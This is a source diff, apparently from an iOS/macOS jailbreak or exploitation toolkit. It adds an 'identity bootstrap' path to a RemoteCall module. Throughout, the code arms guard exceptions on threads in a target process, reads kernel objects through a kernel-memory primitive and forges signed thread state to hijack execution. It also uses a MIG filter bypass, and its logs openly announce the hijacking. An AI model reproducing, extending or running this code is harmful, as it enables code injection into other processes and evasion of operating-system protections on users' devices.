+    CNDRemoteCallIdentityRequest identityRequest = {0};
+    BOOL usingIdentityBootstrap = g_RC_identityBootstrapRequested;
     int firstExceptionTimeoutMS = g_RC_firstExceptionTimeoutMS > 0 ? g_RC_firstExceptionTimeoutMS : 120000;
     RC_DEBUG("[%s:%d] First exception wait timeout=%dms\n",
              __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
-    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
+    BOOL firstExceptionReceived = NO;
+    if (usingIdentityBootstrap) {
+        kern_return_t receiveKR = remote_call_receive_identity(
+            firstExceptionPort, &identityRequest, firstExceptionTimeoutMS);
+        firstExceptionReceived = receiveKR == KERN_SUCCESS;
+        g_RC_identityMessageValid = firstExceptionReceived &&
+            remote_call_identity_request_is_valid(&identityRequest);
+        if (g_RC_identityMessageValid) {
+            memcpy(&exc.threadState, identityRequest.old_state,
+                   sizeof(exc.threadState));
+            exc.exception = (uint32_t)identityRequest.exception;
+            exc.codeCnt = identityRequest.codeCnt;
+            if (identityRequest.codeCnt > 0) {
+                exc.codeFirst = (uint64_t)identityRequest.code[0];
+            }
+            if (identityRequest.codeCnt > 1) {
+                exc.codeSecond = (uint64_t)identityRequest.code[1];
+            }
+        } else {
+            printf("[RemoteCall] identity bootstrap receive/validation failed "
+                   "kr=0x%x id=%d size=%u descriptors=%u flavor=%d count=%u\n",
+                   receiveKR, identityRequest.Head.msgh_id,
+                   identityRequest.Head.msgh_size,
+                   identityRequest.msgh_body.msgh_descriptor_count,
+                   identityRequest.flavor, identityRequest.old_stateCnt);
+        }
+    } else {
+        firstExceptionReceived = wait_exception(
+            firstExceptionPort, &exc, firstExceptionTimeoutMS, false);
+    }
+    if (!firstExceptionReceived ||
+        (usingIdentityBootstrap && !g_RC_identityMessageValid)) {
         printf("[%s:%d] Failed to receive first exception within %dms\n",
                __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
         for (NSNumber *thread in g_RC_threadList) {
@@ -2136,8 +2566,71 @@ static int init_remote_call_configured(const char* process,
             clear_guard_exception(threadAddr);
         }
         remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
+        remote_call_release_identity_request_rights(&identityRequest, false);
         abandon_remote_call();
         return -1;
+    }
+
+    if (usingIdentityBootstrap) {
+        uint64_t deliveredThread = task_get_ipc_port_kobject(
+            selfTask, identityRequest.thread.name);
+        uint64_t deliveredTask = task_get_ipc_port_kobject(
+            selfTask, identityRequest.task.name);
+        BOOL armedThreadExact = NO;
+        for (NSNumber *thread in g_RC_threadList) {
+            if (thread.unsignedLongLongValue == deliveredThread) {
+                armedThreadExact = YES;
+                break;
+            }
+        }
+        g_RC_identityThreadRightExact =
+            is_kaddr_valid(deliveredThread) && armedThreadExact &&
+            thread_get_task(deliveredThread) == g_RC_taskAddr;
+        g_RC_identityTaskRightExact =
+            is_kaddr_valid(deliveredTask) && deliveredTask == g_RC_taskAddr;
+        if (!g_RC_identityThreadRightExact ||
+            !g_RC_identityTaskRightExact) {
+            printf("[RemoteCall] identity bootstrap right mismatch "
+                   "thread=%#llx armed=%s task=%#llx expected-task=%#llx\n",
+                   deliveredThread, armedThreadExact ? "yes" : "no",
+                   deliveredTask, g_RC_taskAddr);
+            (void)remote_call_reply_identity(
+                &identityRequest, &exc.threadState);
+            remote_call_release_identity_request_rights(
+                &identityRequest, false);
+            for (NSNumber *thread in g_RC_threadList) {
+                clear_guard_exception(thread.unsignedLongLongValue);
+            }
+            remote_call_note_init_failure(
+                RemoteCallInitFailureOther, targetPid);
+            abandon_remote_call();
+            return -1;
+        }
+
+        g_RC_trojanThreadAddr = deliveredThread;
+        g_RC_identityThreadAddr = deliveredThread;
+        g_RC_identityThreadPort = identityRequest.thread.name;
+        identityRequest.thread.name = MACH_PORT_NULL;
+        remote_call_release_identity_request_rights(&identityRequest, true);
+        g_RC_identityTrapAddress =
+            remote_call_resolve_identity_trap_address();
+        if (!g_RC_identityTrapAddress) {
+            printf("[RemoteCall] identity bootstrap has no validated "
+                   "executable trap address\n");
+            (void)remote_call_reply_identity(
+                &identityRequest, &exc.threadState);
+            remote_call_release_identity_thread_right();
+            remote_call_note_init_failure(
+                RemoteCallInitFailureOther, targetPid);
+            abandon_remote_call();
+            return -1;
+        }
+        g_RC_identityHandlerRetained = true;
+        printf("[RemoteCall] identity bootstrap bound exact target "
+               "thread=%#llx port=0x%x task=%#llx trap=%#llx; future exceptions use "
+               "validated identity delivery.\n",
+               g_RC_identityThreadAddr, g_RC_identityThreadPort,
+               g_RC_taskAddr, g_RC_identityTrapAddress);
     }
     
     printf("[RemoteCall] Thread trapped — hijacking execution inside %s.\n", process);
@@ -2146,31 +2639,32 @@ static int init_remote_call_configured(const char* process,
            sizeof(arm_thread_state64_internal));
     g_RC_capturedOriginalStateCount = 1;
 
-    // The exception message uses EXCEPTION_STATE rather than identity, so it
-    // does not carry a thread port.  Infer the delivered thread before clearing
-    // the remaining guards: the consumed AST_GUARD is clear on that thread and
-    // remains set on peers that have not delivered.
-    uint64_t deliveredThread = 0;
-    NSUInteger deliveredCandidates = 0;
-    for (NSNumber *thread in g_RC_threadList) {
-        uint64_t threadAddr = thread.unsignedLongLongValue;
-        uint32_t ast = kread32(threadAddr + off_thread_ast);
-        BOOL live = thread_get_task(threadAddr) == g_RC_taskAddr;
-        printf("[RemoteCall] trapped-thread candidate=%#llx live=%s ast=%#x guard=%s\n",
-               threadAddr, live ? "yes" : "no", ast,
-               (ast & 0x1000U) ? "set" : "clear");
-        if (live && !(ast & 0x1000U)) {
-            deliveredThread = threadAddr;
-            deliveredCandidates++;
+    if (!usingIdentityBootstrap) {
+        // State-only delivery carries no thread port. Infer the delivered
+        // thread from the one consumed AST_GUARD as before.
+        uint64_t deliveredThread = 0;
+        NSUInteger deliveredCandidates = 0;
+        for (NSNumber *thread in g_RC_threadList) {
+            uint64_t threadAddr = thread.unsignedLongLongValue;
+            uint32_t ast = kread32(threadAddr + off_thread_ast);
+            BOOL live = thread_get_task(threadAddr) == g_RC_taskAddr;
+            printf("[RemoteCall] trapped-thread candidate=%#llx live=%s ast=%#x guard=%s\n",
+                   threadAddr, live ? "yes" : "no", ast,
+                   (ast & 0x1000U) ? "set" : "clear");
+            if (live && !(ast & 0x1000U)) {
+                deliveredThread = threadAddr;
+                deliveredCandidates++;
+            }
         }
-    }
-    if (deliveredCandidates == 1) {
-        g_RC_trojanThreadAddr = deliveredThread;
-        printf("[RemoteCall] identified delivered thread=%#llx from consumed guard\n",
-               deliveredThread);
-    } else {
-        printf("[RemoteCall] delivered-thread inference ambiguous candidates=%lu; using first armed thread=%#llx\n",
-               (unsigned long)deliveredCandidates, g_RC_trojanThreadAddr);
+        if (deliveredCandidates == 1) {
+            g_RC_trojanThreadAddr = deliveredThread;
+            printf("[RemoteCall] identified delivered thread=%#llx from consumed guard\n",
+                   deliveredThread);
+        } else {
+            printf("[RemoteCall] delivered-thread inference ambiguous candidates=%lu; using first armed thread=%#llx\n",
+                   (unsigned long)deliveredCandidates,
+                   g_RC_trojanThreadAddr);
+        }
     }
 
     for (NSNumber *thread in g_RC_threadList) {
@@ -2178,25 +2672,59 @@ static int init_remote_call_configured(const char* process,
     }
     RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);
     
-    ExceptionMessage exc2;
-    int desiredTimeout = 1500;
-    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
-        if (g_RC_capturedOriginalStateCount <
-            sizeof(remote_call_current_state()->capturedOriginalStates) /
-                sizeof(remote_call_current_state()->capturedOriginalStates[0])) {
-            memcpy(&g_RC_capturedOriginalStates[g_RC_capturedOriginalStateCount],
-                   &exc2.threadState,sizeof(arm_thread_state64_internal));
-            g_RC_capturedOriginalStateCount++;
+    if (!usingIdentityBootstrap) {
+        ExceptionMessage exc2;
+        int desiredTimeout = 1500;
+        while (wait_exception(firstExceptionPort, &exc2, desiredTimeout,
+                              false)) {
+            if (g_RC_capturedOriginalStateCount <
+                sizeof(remote_call_current_state()->capturedOriginalStates) /
+                    sizeof(remote_call_current_state()->capturedOriginalStates[0])) {
+                memcpy(&g_RC_capturedOriginalStates[g_RC_capturedOriginalStateCount],
+                       &exc2.threadState,
+                       sizeof(arm_thread_state64_internal));
+                g_RC_capturedOriginalStateCount++;
+            }
+            reply_with_state(&exc2, &exc2.threadState);
         }
-        reply_with_state(&exc2, &exc2.threadState);
     }
     
     if (!g_RC_trojanThreadAddr)
         g_RC_trojanThreadAddr = firstThread;
 
     arm_thread_state64_internal newState = exc.threadState;
-    sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
-    reply_with_state(&exc, &newState);
+    uint64_t initialTrapPC = usingIdentityBootstrap
+        ? g_RC_identityTrapAddress : FAKE_PC_TROJAN_CREATOR;
+    uint64_t initialTrapLR = usingIdentityBootstrap
+        ? g_RC_identityTrapAddress : FAKE_LR_TROJAN_CREATOR;
+    BOOL initialConversionSucceeded = sign_state(
+        g_RC_trojanThreadAddr, &newState,
+        initialTrapPC, initialTrapLR);
+    g_RC_identityInitialConversionSucceeded =
+        usingIdentityBootstrap && initialConversionSucceeded;
+    BOOL initialReplySucceeded = initialConversionSucceeded &&
+        (usingIdentityBootstrap
+            ? remote_call_reply_identity(&identityRequest, &newState) ==
+                KERN_SUCCESS
+            : reply_with_state(&exc, &newState));
+    g_RC_identityInitialReplySucceeded =
+        usingIdentityBootstrap && initialReplySucceeded;
+    if (!initialReplySucceeded) {
+        printf("[RemoteCall] initial target conversion/reply failed "
+               "identity=%s converted=%s\n",
+               usingIdentityBootstrap ? "yes" : "no",
+               initialConversionSucceeded ? "yes" : "no");
+        if (usingIdentityBootstrap && !initialConversionSucceeded) {
+            (void)remote_call_reply_identity(
+                &identityRequest, &exc.threadState);
+        }
+        remote_call_release_identity_request_rights(
+            &identityRequest, false);
+        remote_call_release_identity_thread_right();
+        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
+        abandon_remote_call();
+        return -1;
+    }
 
     if (g_RC_originalThreadOnly) {
         g_RC_creatingExtraThread = false;
@@ -2287,7 +2815,11 @@ static int init_remote_call_configured(const char* process,
     if(useMigFilterBypass)
         mig_bypass_resume();
     
-    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
+    if (!set_exception_port_on_thread(secondExceptionPort,
+                                      g_RC_callThreadAddr,
+                                      useMigFilterBypass,
+                                      EXCEPTION_STATE |
+                                          MACH_EXCEPTION_CODES)) {
         printf("[%s:%d] Failed to install exception port on running bootstrap thread\n",
                __FUNCTION__, __LINE__);
         if (useMigFilterBypass) mig_bypass_pause();
@@ -2342,6 +2874,7 @@ static int init_remote_call_configured(const char* process,
 
 int init_remote_call(const char* process, bool useMigFilterBypass)
 {
+    g_RC_identityBootstrapRequested = false;
     return init_remote_call_configured(process, useMigFilterBypass, 2, nil);
 }
 
@@ -2365,6 +2898,27 @@ int init_remote_call_original_thread_only_with_first_exception_timeout(const cha
     return result;
 }
 
+int init_remote_call_identity_bootstrap_original_thread_only(
+    const char *process, int firstExceptionTimeoutMS)
+{
+    RemoteCallState *state = remote_call_current_state();
+    bool previousOriginalThreadOnly = state->originalThreadOnly;
+    int previousTimeout = state->firstExceptionTimeoutMS;
+    state->originalThreadOnly = true;
+    state->identityBootstrapRequested = true;
+    state->firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0
+        ? firstExceptionTimeoutMS : 15000;
+
+    /* One armed thread makes the identity message's kernel-minted right
+     * unambiguous and prevents a second identity-form message from being
+     * queued while the delivered thread is downgraded to state-only. */
+    int result = init_remote_call_configured(process, false, 1, nil);
+
+    state->originalThreadOnly = previousOriginalThreadOnly;
+    state->firstExceptionTimeoutMS = previousTimeout;
+    return result;
+}
+
 @implementation RemoteCallSession {
     RemoteCallState _state;
 }
@@ -2384,6 +2938,33 @@ int init_remote_call_original_thread_only_with_first_exception_timeout(const cha
               useMigFilterBypass:useMigFilterBypass
          firstExceptionTimeoutMS:firstExceptionTimeoutMS
               originalThreadOnly:NO];
+}
+
+- (instancetype)initWithIdentityBootstrapProcess:(NSString *)process
+                          firstExceptionTimeoutMS:(int)firstExceptionTimeoutMS
+{
+    self = [super init];
+    if (!self) return nil;
+
+    memset(&_state, 0, sizeof(_state));
+    _state.labClient.socketFD = -1;
+    _state.success = true;
+    _state.threadList = [NSMutableArray new];
+    _state.firstExceptionTimeoutMS = firstExceptionTimeoutMS > 0
+        ? firstExceptionTimeoutMS : 15000;
+    _state.stableExceptionTimeoutFloorMS = 10000;
+    _state.originalThreadOnly = true;
+    _state.identityBootstrapRequested = true;
+
+    const char *processName = process.UTF8String;
+    if (!processName) return nil;
+
+    RemoteCallState *previous = remote_call_push_state(&_state);
+    int result = init_remote_call_configured(
+        processName, false, 1, nil);
+    if (result != 0) abandon_remote_call();
+    remote_call_pop_state(previous);
+    return result == 0 ? self : nil;
 }
 
 - (instancetype)initWithProcess:(NSString *)process
